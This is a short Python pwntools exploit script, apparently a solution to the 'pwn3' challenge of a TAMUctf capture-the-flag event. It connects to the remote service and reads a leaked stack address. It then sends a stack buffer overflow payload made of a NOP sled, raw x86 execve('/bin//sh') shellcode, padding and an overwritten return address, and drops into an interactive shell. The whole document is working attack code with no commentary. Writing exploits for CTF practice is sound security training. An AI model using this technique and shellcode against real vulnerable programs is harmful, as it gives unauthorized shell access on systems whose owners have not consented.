from pwn import *

#p=process('./pwn3')
p=remote("pwn.tamuctf.com",4323)

tmp=""
adr=""
payload=""
tmp=p.recv(2020)
adr=tmp[-12:-2]
print(adr)

payload+="\x90"*90
payload+="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\x31\xd2\xcd\x80"
payload+="A"*0xBB
payload+=p32(int(adr,0))

p.sendline(payload)
p.interactive()
